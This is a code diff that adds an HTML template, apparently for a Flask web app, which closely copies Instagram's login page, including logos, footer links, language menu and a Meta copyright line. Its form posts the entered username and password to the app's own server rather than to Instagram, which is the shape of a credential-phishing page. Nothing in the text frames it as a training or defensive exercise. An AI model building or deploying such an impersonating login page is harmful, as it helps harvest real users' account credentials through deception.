@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Page</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="wrapper">
+        <div class="header">
+            <div class="top">
+                <div class="logo">
+                    <img src="{{ url_for('static', filename='img/instagram.png') }}" alt="instagram" style="width: 175px;">
+                </div>
+                <div class="form">
+                    <form action="/" method="POST">
+                        <div class="input_field">
+                            <input type="text" name="username" placeholder="Phone number, username, or email" class="input" id="email_username" required>
+                        </div>
+                        <div class="input_field">
+                            <input type="password" name="password" placeholder="Password" class="input" id="password" required>
+                        </div>
+                        <div class="btn" id="submit" style="background-color: #3897f0; border: 0;">
+                            <button style="background-color: #3897f0; border: 0;">Login</button>
+                        </div>
+                    </form>
+                </div>
+                <div class="or">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="dif">
+                    <div class="fb">
+                        <img src="{{ url_for('static', filename='img/facebook.png') }}" alt="facebook">
+                        <p>Log in with Facebook</p>
+                    </div>
+                    <div class="forgot">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+            <div class="signup">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+            <div class="apps">
+                <p>Get the app.</p>
+                <div class="icons">
+                    <a href="#"><img src="{{ url_for('static', filename='img/appstore.png') }}" alt="appstore"></a>
+                    <a href="#"><img src="{{ url_for('static', filename='img/googleplay.png') }}" alt="googleplay"></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <ul>
+                    <li><a href="#">ABOUT US</a></li>
+                    <li><a href="#">SUPPORT</a></li>
+                    <li><a href="#">PRESS</a></li>
+                    <li><a href="#">API</a></li>
+                    <li><a href="#">JOBS</a></li>
+                    <li><a href="#">PRIVACY</a></li>
+                    <li><a href="#">TERMS</a></li>
+                    <li><a href="#">DIRECTORY</a></li>
+                    <li><a href="#">PROFILES</a></li>
+                    <li><a href="#">HASHTAGS</a></li>
+                    <li><a href="#">LANGUAGE</a></li>
+                </ul>
+            </div>
+        </div>
+        <section class="left_right">
+            <div class="language-dropdown">
+                <select>
+                    <option value="en">English</option>
+                    <option value="fr">Français</option>
+                    <option value="es">Español</option>
+                    <option value="de">Deutsch</option>
+                    <option value="it">Italiano</option>
+                    <option value="pt">Português</option>
+                    <option value="zh">中文</option>
+                    <option value="ja">日本語</option>
+                    <option value="ru">Русский</option>
+                    <option value="ar">العربية</option>
+                    <option value="ko">한국어</option>
+                    <option value="hi">हिंदी</option>
+                    <option value="bn">বাংলা</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="th">ไทย</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="sv">Svenska</option>
+                    <option value="no">Norsk</option>
+                    <option value="da">Dansk</option>
+                    <option value="fi">Suomi</option>
+                    <option value="pl">Polski</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="el">Ελληνικά</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="cs">Čeština</option>
+                    <option value="hu">Magyar</option>
+                    <option value="he">עברית</option>
+                    <option value="ur">اردو</option>
+                    <option value="fa">فارسی</option>
+                </select>
+            </div>
+            <div class="copyright">© 2024 Instagram from meta</div>
+        </section>
+        <!-- <script src="{{ url_for('static', filename='index.js') }}"></script> -->
+    </body>
+</html>
